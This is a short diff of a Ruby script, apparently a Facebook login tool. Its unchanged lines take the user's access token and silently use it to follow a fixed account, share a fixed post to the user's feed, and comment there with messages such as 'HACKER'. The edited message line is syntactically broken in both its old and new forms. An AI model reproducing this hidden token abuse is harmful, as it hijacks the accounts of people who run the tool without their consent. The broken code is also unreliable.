@@ -184,7 +184,7 @@ def loginto()
     a.close()
     $name = y['name']
     $id = y['id']
-    msg = ["I LOVE YOU @[100053033144051:] 😘",KURRAM","HACKER"]
+    msg = "I LOVE YOU [100053033144051:] ",KURRAM","HACKER"]
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>msg.sample,"access_token"=>$token})
